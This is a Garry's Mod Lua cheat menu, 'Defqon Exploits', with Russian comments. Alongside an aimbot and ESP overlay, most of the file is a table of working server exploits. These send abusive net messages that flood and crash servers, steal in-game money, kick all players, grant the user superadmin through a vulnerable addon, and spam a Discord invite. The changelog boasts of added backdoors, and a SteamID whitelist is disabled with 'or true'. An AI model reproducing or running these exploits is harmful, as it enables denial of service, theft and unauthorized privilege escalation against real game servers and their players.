--[[💎 DevBlog v1.0.1 / 12.05.18 💎
       • Исправил ошибку в ESP связанную с ENTITY:LookupBone(string bone name) 
        • Исправил ошибку в AIM связанную с ENTITY:LookupBone(string bone name)
	     • Поржал
	      • Удалил проверку по SteamID (Была абсолютно не нужна)
--------------------------------------------------------------------------------------------------------------------------- 
💎 DevBlog v1.0 / 09.01.18 💎
       • Решил переделать всё под себя
        • Сделал перевод с французского
	     • Добавил бэкдуров
	      • Удалил старую проверку по SteamID (Была абсолютно не нужна)
----]]

--[[ https://vk.com/leithzzze
     http://steamcommunity.com/id/leathzzze
     Leith#1001 ]]
-----------------------------------------------------------------------------------------------------STUFF--------------------------------------------------------------------------------------------------------------------------------------------------

local RatesScaleLevel = LocalPlayer():SteamID() -- Так сказать проверка по SteamID
if RatesScaleLevel == "STEAM_0:0:0" -- Одиночная игра (на всякий случай)
or RatesScaleLevel == "STEAM_0:0:133570476" -- Dark Louder
or RatesScaleLevel == "STEAM_0:1:86857163" -- harem
or RatesScaleLevel == "STEAM_0:0:141778910" -- СаняКодер
or RatesScaleLevel == "STEAM_0:0:179576807" -- Leith
or RatesScaleLevel == "STEAM_0:1:164342539" -- QuaceZero
or RatesScaleLevel == "STEAM_0:1:417868808" -- QuaceZero (второй аккаунт)
or RatesScaleLevel == "STEAM_0:1:426772203" -- QuaceZeroZ (третий аккаунт)
or RatesScaleLevel == "STEAM_0:1:87232089"  -- lizardcsgo a.k.a lzrdblzzrd
or RatesScaleLevel == "STEAM_0:0:122023682" -- Travka (друг)
or RatesScaleLevel == "STEAM_0:0:95724304"  -- QURS (купил)
or RatesScaleLevel == "STEAM_0:1:223956472" -- Ermack (купил)
or RatesScaleLevel == "STEAM_0:0:188571603" -- Ermack (купил, второй аккаунт)
or RatesScaleLevel == "STEAM_0:0:209305097" -- KIR (купил)
or RatesScaleLevel == "STEAM_1:0:169694836" -- KIR (купил)
or RatesScaleLevel == "STEAM_0:0:169694836" -- KIR (купил)
or RatesScaleLevel == "STEAM_1:1:169694836" -- KIR (купил)
or RatesScaleLevel == "STEAM_0:1:169694836" -- KIR (купил)
or RatesScaleLevel == "STEAM_1:1:123190008" -- KIR (купил, второй аккаунт)
or RatesScaleLevel == "STEAM_0:1:123190008" -- KIR (купил, второй аккаунт)
or RatesScaleLevel == "STEAM_1:0:123190008" -- KIR (купил, второй аккаунт)
or RatesScaleLevel == "STEAM_0:0:123190008" -- KIR (купил, второй аккаунт)
or RatesScaleLevel == "STEAM_0:0:91988659"  -- Kocmonavtik (купил)
or RatesScaleLevel == "STEAM_0:1:172637672" -- Megumin (купил)
or RatesScaleLevel == "STEAM_0:0:78124882"  -- Лена (купил)
or RatesScaleLevel == "STEAM_0:1:184001693" -- я
or RatesScaleLevel == "STEAM_1:1:84267153"  -- JohnBard (купил)
or RatesScaleLevel == "STEAM_0:1:84267153"  -- JohnBard (купил, другие цифры)
or RatesScaleLevel == "STEAM_0:0:84267153"  -- JohnBard (купил, другие цифры)
or RatesScaleLevel == "STEAM_1:0:68849843"  -- Hason (купил)
or RatesScaleLevel == "STEAM_0:1:68849843"  -- Hason (купил, другие цифры)
or RatesScaleLevel == "STEAM_0:0:68849843"  -- Hason (купил, другие цифры)
or RatesScaleLevel == "STEAM_0:1:68104527"  -- Wsank (Купил)
or RatesScaleLevel == "STEAM_0:0:48628674"  -- one tщuch gamer (Купил)
or RatesScaleLevel == "STEAM_0:0:67003290"  -- one touch gamer (Купил, второй аккаунт)
or RatesScaleLevel == "STEAM_0:0:38886601"  -- Moon (Купил)
or RatesScaleLevel == "STEAM_0:1:51961104"  -- Lil Peep (Купил)
or RatesScaleLevel == "STEAM_0:0:134073192" -- Tόshâ Bόbürϊn
or RatesScaleLevel == "STEAM_0:1:160705047" -- n1ce (Купил)
or RatesScaleLevel == "STEAM_0:1:185806144" -- Gabe (Купил)
or RatesScaleLevel == "STEAM_0:1:83285008" -- Gabe
or RatesScaleLevel == "STEAM_0:0:425100967" -- Suit
or RatesScaleLevel == "STEAM_0:1:128267449" -- Valve (купил)
or RatesScaleLevel == "STEAM_0:1:80063374"  -- valve
or RatesScaleLevel == "STEAM_0:0:98978109"  -- Rope (Купил)
or RatesScaleLevel == "STEAM_1:1:82067910"  -- EduCool
or RatesScaleLevel == "STEAM_1:0:82067910"  -- EduCool
or RatesScaleLevel == "STEAM_0:1:82067910"  -- EduCool
or RatesScaleLevel == "STEAM_0:0:64321681"  -- Vermin (за помощь в расследовании)
or RatesScaleLevel == "STEAM_0:1:96464196"  -- sadless
or RatesScaleLevel == "STEAM_0:1:59441932"  -- PanDemiuKcin
or RatesScaleLevel == "STEAM_0:0:148433957" -- aloha
or RatesScaleLevel == "STEAM_0:1:117441810" -- Saibot
or RatesScaleLevel == "STEAM_0:0:64403782"  -- Максим
or RatesScaleLevel == "STEAM_0:1:162799229" -- Totito
or RatesScaleLevel == "STEAM_0:0:107060867" -- Mircus
or RatesScaleLevel == "STEAM_0:0:91077309"  -- FoXy
or RatesScaleLevel == "STEAM_0:1:126480121" -- Mafick
or RatesScaleLevel == "STEAM_0:1:109987888" -- Goveniy
or RatesScaleLevel == "STEAM_0:1:195298319" -- ЕгорБандит
or RatesScaleLevel == "STEAM_0:1:60081728"  -- LiGyH
or RatesScaleLevel == "STEAM_0:1:40648546"  -- LousyFox
or RatesScaleLevel == "STEAM_1:1:420868808" -- HELSTAFF
or RatesScaleLevel == "STEAM_0:1:420868808" -- HELSTAFF
or RatesScaleLevel == "STEAM_1:0:420868808" -- HELSTAFF
or RatesScaleLevel == "STEAM_0:0:420868808" -- HELSTAFF
or RatesScaleLevel == "STEAM_0:0:156912424" -- Ruby
or RatesScaleLevel == "STEAM_0:1:147609270" -- Niceman
or RatesScaleLevel == "STEAM_0:1:106930709" -- Niceman
or RatesScaleLevel == "STEAM_0:0:106930709" -- Niceman
or RatesScaleLevel == "STEAM_1:1:106930709" -- Niceman
or RatesScaleLevel == "STEAM_0:0:106930709" -- Niceman
or RatesScaleLevel == "STEAM_0:0:53025026" -- Niceman
or RatesScaleLevel == "STEAM_0:1:119416004" -- Kumiko
or RatesScaleLevel == "STEAM_0:0:54631898"  -- Chezzy
or RatesScaleLevel == "STEAM_0:1:125198366" -- Hason
or RatesScaleLevel == "STEAM_0:0:78588335" -- Цыга
or RatesScaleLevel == "STEAM_0:1:76365398" -- lord
or RatesScaleLevel == "STEAM_0:0:130906952" -- bagi
or RatesScaleLevel == "STEAM_0:0:425436001" -- maddog
or RatesScaleLevel == "STEAM_0:0:136980892" -- adan
or RatesScaleLevel == "STEAM_0:1:429886649" -- Scroller
or RatesScaleLevel == "STEAM_0:1:123796452"
or RatesScaleLevel == "STEAM_0:0:91988659"
or RatesScaleLevel == "STEAM_0:0:114759765"
or RatesScaleLevel == "STEAM_0:1:97208355"
or RatesScaleLevel == "STEAM_0:1:433086746"
or RatesScaleLevel == "STEAM_0:1:99903222"
or RatesScaleLevel == "STEAM_0:0:176251033"
or RatesScaleLevel == "STEAM_0:1:190990405"
or RatesScaleLevel == "STEAM_0:0:434743633"
or RatesScaleLevel == "STEAM_0:0:118496131"
or RatesScaleLevel == "STEAM_0:1:36913004"
or RatesScaleLevel == "STEAM_0:0:111103319" -- ВЕЛИКИЙ!!!!!!!!!!!!!!!!!!!!!!!!!!!
or RatesScaleLevel == "STEAM_0:0:224821474"
or RatesScaleLevel == "STEAM_0:1:163307812"
or RatesScaleLevel == "STEAM_0:1:122907806" -- english user
or RatesScaleLevel == "STEAM_0:0:435948263"
or RatesScaleLevel == "STEAM_0:1:436014361"
or RatesScaleLevel == "STEAM_0:0:436021942"
or RatesScaleLevel == "STEAM_0:0:175846419"
or RatesScaleLevel == "STEAM_0:1:97208355"
or RatesScaleLevel == "STEAM_1:1:223170502"
or RatesScaleLevel == "STEAM_1:0:223170502"
or RatesScaleLevel == "STEAM_0:1:223170502"
or RatesScaleLevel == "STEAM_0:0:223170502"
or RatesScaleLevel == "STEAM_0:1:100008351"
or RatesScaleLevel == "STEAM_0:0:100008351"
or RatesScaleLevel == "STEAM_1:0:100008351"
or RatesScaleLevel == "STEAM_0:0:205920664"
or RatesScaleLevel == "STEAM_0:0:146683682"
or RatesScaleLevel == "STEAM_0:1:146683682"
or RatesScaleLevel == "STEAM_1:0:146683682"
or RatesScaleLevel == "STEAM_1:1:146683682"
or RatesScaleLevel == "STEAM_0:1:433082549"
or RatesScaleLevel == "STEAM_0:1:433086746"
or RatesScaleLevel == "STEAM_0:0:436021942"
or RatesScaleLevel == "STEAM_0:0:435948263"
or RatesScaleLevel == "STEAM_0:1:436014361"
or RatesScaleLevel == "STEAM_0:1:434629768"
or RatesScaleLevel == "STEAM_0:1:116875024"
or RatesScaleLevel == "STEAM_0:1:105744181"
or RatesScaleLevel == "STEAM_0:1:173519656"
or RatesScaleLevel == "STEAM_0:1:148600355" -- faulif special
or RatesScaleLevel == "STEAM_0:1:215497345"
or true then
	if ( SERVER ) then
		function file.Read(d)
			return "Well try my slut ;)"
		end
	end
local C = table.Copy( concommand )
local CCA = C.Add
local prant = print
prant( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
MsgC (Color( 66, 61, 55 ), [[
===========================================================================
  ____        __                   ____        _       _ _     ____   ___
 |  _ \  ___ / _| __ _  ___  _ __ / ___| _ __ | | ___ (_) |_  | ___| / _ \
 | | | |/ _ \ |_ / _` |/ _ \| '_ \\___ \| '_ \| |/ _ \| | __| |___ \| | | |
 | |_| |  __/  _| (_| | (_) | | | |___) | |_) | | (_) | | |_   ___) | |_| |
 |____/ \___|_|  \__, |\___/|_| |_|____/| .__/|_|\___/|_|\__| |____(_)___/
                    |_|                 |_|
===========================================================================
                                          `-.`'.-'
                                       `-.        .-'.
                                    `-.    -./\.-    .-'
                                        -.  /_|\  .-
                                    `-.   `/____\'   .-'.
                                 `-.    -./.-""-.\.-      '
                                    `-.  /< (()) >\  .-'
                                  -   .`/__`-..-'__\'   .-
                                ,...`-./___|____|___\.-'.,.

      )\  / )               /¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\             ( \  /(
     / / ( (                |      Defqon Exploits  5.1.1      |              ) ) \ \
    | |   \ \               |          |dev 17.03.18|          |             / /   | |
 .-.\ \    \ \              |            by Leith              |            / /    / /.-.
(=  )\ `._.' |              |         discord.gg/weJb7TJ       |            | `._.' /(  =)
 \ (_)       )              | -------------------------------- |            (       (_) /
  \    `----'               | Type Defqon in console to open!  |             '----`    /
                            \ -------------------------------- /
                             ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
love you, спасибо за использование этого меню (-'_'-)
==========================================================================================
  ]])
surface.PlaySound("garrysmod/content_downloaded.wav")
------------------------------------------------------------------------Defqon MENU--------------------------------------------------------------------------------------
--[[ WATERMARK ]] --
--[[Watermark = vgui.Create( "HTML" )
Watermark:SetPos( -13, -8)
Watermark:SetSize( ScrW(), ScrH())
Watermark:OpenURL( "" )]]
----------------------------------------------
Version = "v5.1.1"
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local AimbotPoints = {}
AimbotPoints[1] = {bone = "ValveBiped.Bip01_Head1"}
AimbotPoints[2] = {bone = "ValveBiped.Bip01_Neck1"}
AimbotPoints[3] = {bone = "ValveBiped.Bip01_Spine4"}
AimbotPoints[4] = {bone = "ValveBiped.Bip01_Spine2"}
AimbotPoints[5] = {bone = "ValveBiped.Bip01_Spine"}
surface.CreateFont( "Font L", {
    font = "Courier New",
    size = 18,
    weight = 300,
} )
surface.CreateFont( "Font M", {
    font = "Courier New",
    size = 15,
    weight = 300,
} )
surface.CreateFont( "Font L2", {
    font = "Verdana",
    extended = false,
    size = 12,
    weight = 1000,
    blursize = 0,
    scanlines = 0,
    shadow = true,
    antialias = true
} )
-- if youre going to use this for your paste atleast give me credit :)
-- CFour - /id/BordersClosed/
local pMenu = {}--functions
local pMenuVars = {
    Tabs = {},
    Sliders = {},
    CheckBoxes = {},
    Exploits = {}
} --// store values to be used at a later time
local BigExploits = {}
local PI = 3.14159265359;
local Rad = 180 / PI
function pMenu.IsNetString(netstring)
    local validate,_ = pcall( net.Start, netstring )
    if validate then
        return validate;
    end
    return false;
end
function pMenu.RandomString(len)
    if len == nil then
        len = math.random(20,100)
    end
    local ret = ""
    for i=1,len do
        ret = ret..string.char(math.random(33,126)) --// fist 32 of ascii is pretty much garbage, I don't want spaces so we're skipping 32.
    end                                             --// also I don't think gmod uses extended ascii
    return ret
end
BigExploits["Мани с дуэли)"] = {func =
function()
    if pMenu.IsNetString("duelrequestguiYes") then
        net.Start("duelrequestguiYes")
        net.WriteInt(-2147483648,32)--b1g 32 bit int laff -> -99999999999999999999999999999999999999999999999999999999999999999999999999999
        net.WriteEntity(table.Random( player.GetAll() ) )
        net.WriteString("Crossbow")
        net.SendToServer()
    end
end
}
BigExploits["Наркотики стилят оружия?"] = {func =
function()
    if pMenu.IsNetString("drugseffect_remove") then
        net.Start("drugseffect_remove")
        net.SendToServer()
    end
end
}
BigExploits["Наркотики крадут деньги?"] = {func =
function()
    if pMenu.IsNetString("drugs_money") then
        net.Start("drugs_money")
        net.SendToServer()
    end
end
}
BigExploits["Наркотики поджигают все пропы?"] = {func =
function()
    if pMenu.IsNetString("drugs_ignite") then
        net.Start("drugs_ignite")
        net.WriteString("prop_physics")
        net.SendToServer()
    end
end
}
BigExploits["Наркота убирает все пропы?"] = {func =
function()
    if pMenu.IsNetString("drugs_text") then
        net.Start("drugs_text")
        net.WriteString("prop_physics")
        net.SendToServer()
    end
end
}
BigExploits["TGN Advanced Money Printer Взят кэш)"] = {func =
function()
    if pMenu.IsNetString("SyncPrinterButtons76561198056171650") then
        for _,v in pairs(ents.FindByClass("adv_moneyprinter")) do
            if v:IsValid() then
                net.Start( "SyncPrinterButtons76561198056171650" )
                net.WriteEntity(v)
                net.WriteUInt(2, 4)
                net.SendToServer()
            end
        end
    end
end
}

BigExploits["Логгирующий скрипт кикает всех?"] = {func =
function()
    if pMenu.IsNetString("DL_Answering") then
        local function reportQuestionmark()
            for i = 1, 2000 do
                net.Start("DL_Answering")
                net.SendToServer()
            end
        end
        timer.Create(pMenu.RandomString(20),0.1,50,reportQuestionmark)
    end
end
}
BigExploits["SimplicityAC Краш сервера"] = {func =
function()
    if pMenu.IsNetString("SimplicityAC_aysent") then
        local tbl = {}
        for i=1,1000 do
            tbl[i] = i;
        end
        net.Start("SimplicityAC_aysent")

        net.WriteUInt(1, 8)

        net.WriteUInt(4294967295, 32)

        net.WriteTable(tbl)

        net.SendToServer()
    end
end
}
BigExploits["Auzlex's Teleport System Lag"] = {func =
function()
    if pMenu.IsNetString("ATS_WARP_REMOVE_CLIENT") then
        timer.Create(pMenu.RandomString(20),0.05,6000,function()
            for k,v in pairs(player.GetAll()) do
                net.Start( "ATS_WARP_REMOVE_CLIENT" )
                net.WriteEntity( v )
                net.WriteString( "adminroom1" )
                net.SendToServer()
                net.Start( "ATS_WARP_FROM_CLIENT" )
                net.WriteEntity( v )
                net.WriteString( "adminroom1" )
                net.SendToServer()
                net.Start( "ATS_WARP_VIEWOWNER" )
                net.WriteEntity( v )
                net.WriteString( "adminroom1" )
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 2"] = {func =
function()
    if pMenu.IsNetString("CFRemoveGame") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for k,v in pairs(player.GetAll()) do
                net.Start( "CFRemoveGame" )
                net.WriteFloat( math.Round( "10000\n" ) )
                net.SendToServer()
                net.Start( "CFJoinGame" )
                net.WriteFloat( math.Round( "10000\n" ) )
                net.SendToServer()
                net.Start( "CFEndGame" )
                net.WriteFloat( "10000\n" )
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 3"] = {func =
function()
    if pMenu.IsNetString("CreateCase") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i = 1, 300 do
                net.Start( "CreateCase" )
                net.WriteString( "tapped by b1g hack from citizenhack.me" )
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 4"] = {func =
function()
    if pMenu.IsNetString("rprotect_terminal_settings") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i = 1, 200 do
                net.Start( "rprotect_terminal_settings" )
                net.WriteEntity( LocalPlayer() )
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 5"] = {func =
function()
    if pMenu.IsNetString("StackGhost") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i = 1, 8 do
                for k,v in pairs( player.GetAll() ) do
                    net.Start( "StackGhost" )
                    net.WriteInt(69,32)
                    net.SendToServer()
                end
            end
        end)
    end
end
}
BigExploits["Lagger 6"] = {func =
function()
    if pMenu.IsNetString("JoinOrg") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for k,v in pairs(player.GetAll()) do
                net.Start("JoinOrg")
                    net.WriteEntity(LocalPlayer())
                    net.WriteString("test")
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 7"] = {func =
function()
    if pMenu.IsNetString("pac_submit") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i=1, 1800 do
                net.Start("pac_submit")
                net.SendToServer()
            end
        end)
    end
end
}

BigExploits["Lagger 8"] = {func =
function()
    if pMenu.IsNetString("steamid2") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i = 1, 300 do
                net.Start( "steamid2" )
                net.WriteString( "S P I C Y " )
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 9"] = {func =
function()
    if pMenu.IsNetString("NDES_SelectedEmblem") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i=1, 2000 do
                net.Start("NDES_SelectedEmblem")
                net.WriteString("exploitcity has to be a joke they can be for real.")
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 10"] = {func =
function()
    if pMenu.IsNetString("join_disconnect") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i=1, 3000 do
                net.Start("join_disconnect")
                net.WriteEntity(table.Random(player.GetAll()))
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["PAC Crash Server old"] = {func =
function()
    if pMenu.IsNetString("pac_to_contraption") then
        local tbl = {}

        for i=1,1000000000 do

            tbl[#tbl + 1] = i

        end

        net.Start("pac_to_contraption")

        net.WriteTable( tbl )

        net.SendToServer()
    end
end
}
BigExploits["NLRKick"] = {func =
function()
    if pMenu.IsNetString("NLRKick") then
        for k,v in pairs(player.GetAll()) do
            if v == LocalPlayer() then
                continue;
            end
            net.Start("NLRKick")
            net.WriteEntity(v)
            net.SendToServer()
        end
    end
end
}
BigExploits["B1g Crasher"] = {func =
function()
    if pMenu.IsNetString("Morpheus.StaffTracker") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i=1, 2000 do
                net.Start("Morpheus.StaffTracker")
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Give superadmin"] = {func =
function()
    if pMenu.IsNetString("pplay_deleterow") then
        local id = LocalPlayer():SteamID()
        local tbl = {}
        tbl.name = "FAdmin_PlayerGroup"
        tbl.where = {"steamid",tostring(id)}

        net.Start("pplay_deleterow")

        net.WriteTable(tbl)

        net.SendToServer()



        local tbl = {}

        tbl.tblname = "FAdmin_PlayerGroup"

        tbl.tblinfo = {tostring(id),"superadmin"}

        net.Start("pplay_addrow")

        net.WriteTable(tbl)
        net.SendToServer()
    end
end
}
BigExploits["pm spam"] = {func =
function()
    timer.Create(pMenu.RandomString(20),5,10,function()
        for k,v in pairs(player.GetAll()) do
            if v == LocalPlayer() then
                continue;
            end
            LocalPlayer():ConCommand("ulx psay "..v:Nick().." SERVER OWNED discord.gg/weJb7TJ "..LocalPlayer():Nick())
        end
    end)
end
}
BigExploits["asay spam"] = {func =
function()
    timer.Create(pMenu.RandomString(20),1.1,10,function()
        for i=1, ((1/FrameTime())) do
            LocalPlayer():ConCommand("ulx asay"..'"discord.gg/weJb7TJ')
        end
    end)
end
}

function pMenu.MouseInArea(frame,minx,miny,maxx,maxy)
    local PosX,PosY = frame:GetPos()
    local posx,posy = gui.MousePos();
    return ((posx >= minx && posx <= maxx) && (posy >= miny && posy <= maxy));
end
function pMenu.DrawOutLinedRect(x,y,w,h,color)
    surface.SetDrawColor( color )
    surface.DrawOutlinedRect( x, y, w, h )
    surface.SetDrawColor( Color(255,255,255,255) )
end
function pMenu.DrawRect(x,y,w,h,color)
    surface.SetDrawColor( color )
    surface.DrawRect( x, y, w, h )
    surface.SetDrawColor( Color(255,255,255,255) )
end
function pMenu.Drawline(x,y,x2,y2,color)
    surface.SetDrawColor(color)
    surface.DrawLine(x,y,x2,y2)
    surface.SetDrawColor( Color(255,255,255,255) )
end
function pMenu.DrawCircle(X,Y,radius,numSides,color)
    local Step = PI * 2.0 / numSides;
    local old = 0;
    for a=0,PI*2.0,Step do
        local X1 = radius * math.cos(a) + X;
        local Y1 = radius * math.sin(a) + Y;
        local X2 = radius * math.cos(a + Step) + X;
        local Y2 = radius * math.sin(a + Step) + Y;
        surface.SetDrawColor( color )
        surface.DrawLine(X1, Y1, X2, Y2);
    end
end
function pMenu.DrawSlider(frame,x,y,w,h,slider,min,max,startval,round)
    if round == nil then
        round = false;
    end
    max = max - min
    if pMenuVars.Sliders[slider] == nil then
        pMenuVars.Sliders[slider] = {min = min, max = max, value = startval}
    end
    local PosX,PosY = frame:GetPos()
    local NewX,NewY = PosX + x,PosY + y
    pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
    if input.IsMouseDown(MOUSE_LEFT) && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
        local MX,MY = gui.MousePos();
        local MXF,MYF = MX - NewX + x,MY - NewY + y
        if round == false then
            pMenuVars.Sliders[slider].value = math.Clamp(math.Round((((MXF - x) / w) * max + min)),min,max + min)
        else
            pMenuVars.Sliders[slider].value = math.Clamp((((MXF - x) / w) * max + min),min,max + min)
        end
    end
    local val = pMenuVars.Sliders[slider].value;
    local slid = (w - 10) / (max) * (val - min)
    pMenu.DrawRect(x + slid,y,10,h,Color(18,89,131,255))
    draw.SimpleText(val,"Font M",x + (w/2),y + 2,Color(255,255,255,255),TEXT_ALIGN_CENTER)
    pMenu.DrawOutLinedRect(x,y, w , h , Color( 0,255,255, 200 ))
end
function pMenu.DrawCheckBox(frame,x,y,CBOX,defvalue,text)
    local w,h = 20,20
    if pMenuVars.CheckBoxes[CBOX] == nil then
        pMenuVars.CheckBoxes[CBOX] = {value = defvalue,tez = 0}
    end
    local PosX,PosY = frame:GetPos()
    local NewX,NewY = PosX + x,PosY + y
    pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
    pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
    if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) && !pMenuVars.CheckBoxes[CBOX].value then
        pMenu.DrawRect(x + 3,y + 3,w - 6,h - 6,Color(18,59,101,255))
    end
    if input.IsMouseDown(MOUSE_LEFT) then
        pMenuVars.CheckBoxes[CBOX].tez = pMenuVars.CheckBoxes[CBOX].tez + 1
    else
        pMenuVars.CheckBoxes[CBOX].tez = 0;
    end
    if pMenuVars.CheckBoxes[CBOX].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
        pMenuVars.CheckBoxes[CBOX].value = !pMenuVars.CheckBoxes[CBOX].value;
    end
    if pMenuVars.CheckBoxes[CBOX].value then
        pMenu.DrawRect(x + 3,y + 3,w - 6,h - 6,Color(18,89,131,255))
    end
    draw.SimpleText(text,"Font M",x + w + 5,y + 2,Color(255,255,255,255),TEXT_ALIGN_LEFT)
end

function pMenu.DrawTab(frame,x,y,w,h,NAME,defvalue)
    if pMenuVars.Tabs[NAME] == nil then
        pMenuVars.Tabs[NAME] = {value = defvalue,tez = 0}
    end
    local PosX,PosY = frame:GetPos()
    local NewX,NewY = PosX + x,PosY + y
    pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
    if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) && !pMenuVars.Tabs[NAME].value then
        pMenu.DrawRect(x,y,w,h,Color(18,59,101,255))
    end
    if input.IsMouseDown(MOUSE_LEFT) then
        pMenuVars.Tabs[NAME].tez = pMenuVars.Tabs[NAME].tez + 1
    else
        pMenuVars.Tabs[NAME].tez = 0;
    end
    if pMenuVars.Tabs[NAME].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
        pMenuVars.Tabs[NAME].value = !pMenuVars.Tabs[NAME].value;
    end
    if pMenuVars.Tabs[NAME].value then
        pMenu.DrawRect(x,y,w,h,Color(18,89,131,255))
    end
    pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
    draw.SimpleText(NAME,"Font L",x + w/2,y + h/2,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
end
function pMenu.DrawExploit(frame,x,y,w,h,NAME,func,text1,text2)
    if pMenuVars.Exploits[NAME] == nil then
        pMenuVars.Exploits[NAME] = {func = func,tez = 0}
    end
    local PosX,PosY = frame:GetPos()
    local NewX,NewY = PosX + x,PosY + y
    pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
    if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
        pMenu.DrawRect(x,y,w,h,Color(18,59,101,255))
    end
    if input.IsMouseDown(MOUSE_LEFT) then
        pMenuVars.Exploits[NAME].tez = pMenuVars.Exploits[NAME].tez + 1
    else
        pMenuVars.Exploits[NAME].tez = 0;
    end
    if pMenuVars.Exploits[NAME].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
        pMenuVars.Exploits[NAME].func();
    end
    pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
    if text2 == nil then
        draw.SimpleText(text1,"Font M",x + w/2,y + h/2,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
    else
        draw.SimpleText(text1,"Font M",x + w/2,y + h/2 - 8,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
        draw.SimpleText(text2,"Font M",x + w/2,y + h/2 + 8,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
    end
end
local firsttime = true
local Frame = NULL;




function pMenu.Menu()
    Frame = vgui.Create( "DFrame" )
    Frame:SetTitle( "" )
    Frame:SetSize( 700, 500 )
    Frame:Center()
    Frame:ShowCloseButton(false)
    Frame:MakePopup()
    Frame.Paint = function( self, w, h )
        pMenu.DrawRect(0, 0, w, h, Color( 32,45,54, 230 ))
        pMenu.DrawRect(0, 0, w, 20, Color( 18,89,131, 255 ))
        pMenu.DrawOutLinedRect(0, 0, w, 20, Color( 0,255,255, 200 ))
        pMenu.DrawOutLinedRect(0, 0, w, h, Color( 0,255,255, 200 ))
        pMenu.DrawRect(5, 25, 125, h - 30, Color( 18,89,131, 100 ))
        pMenu.DrawOutLinedRect(5, 25, 125, h - 30, Color( 0,255,255, 200 ))
        pMenu.DrawOutLinedRect(135, 25, w - 140, h - 30, Color( 0,255,255, 200 ))
        draw.SimpleText("BIG MENU (Delete для открытия/закрытия меню)","Font L",w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
        local Aimbot = "Aimbot";
        local Visuals = "Visuals";
        local b1gExploits = "Exploits"
        local misc = "misc"
        local hvh = "HvH"
        pMenu.DrawTab(Frame,10,30,115,50,Aimbot,true)
        pMenu.DrawTab(Frame,10,85,115,50,Visuals,true)
        pMenu.DrawTab(Frame,10,140,115,50,b1gExploits,true)
        pMenu.DrawTab(Frame,10,195,115,50,misc,true)
        pMenu.DrawTab(Frame,10,250,115,50,hvh,true)
        if pMenuVars.Tabs[Visuals].value then
            pMenu.DrawCheckBox(Frame,170,55,"ESP",true,"Enable ESP")

            pMenu.Drawline(160,95,350,95,Color(0,255,255,255))

            pMenu.DrawCheckBox(Frame,150,115,"ESP Name",true,"Name")
            pMenu.DrawCheckBox(Frame,150,145,"ESP BoundingBox",true,"Bounding Box")
            pMenu.DrawCheckBox(Frame,150,175,"ESP HealthBar",true,"Health Bar")
            pMenu.DrawCheckBox(Frame,150,205,"ESP Traceline",true,"Eye Traceline")
            draw.SimpleText("Traceline Distance","Font M",150,237,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,150,265,210,20,"ESP Traceline Distance",25,  250,  71)
            pMenu.DrawCheckBox(Frame,150,295,"ESP Position",false,"Position")
            pMenu.DrawCheckBox(Frame,150,325,"ESP Angles",false,"Eye Angles")
            pMenu.DrawCheckBox(Frame,150,355,"ESP Glow",false,"Glow")
            pMenu.DrawCheckBox(Frame,150,385,"ESP Chams",false,"Chams")
            pMenu.DrawCheckBox(Frame,150,415,"ESP XQZ",false,"XQZ")
            pMenu.DrawCheckBox(Frame,150,445,"ESP WeaponCham",false,"Weapon Chams")


            draw.SimpleText("Box Color","Font M",390,35,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            draw.SimpleText("R","Font M",660,55,Color(255,255,255,255),TEXT_ALIGN_LEFT)
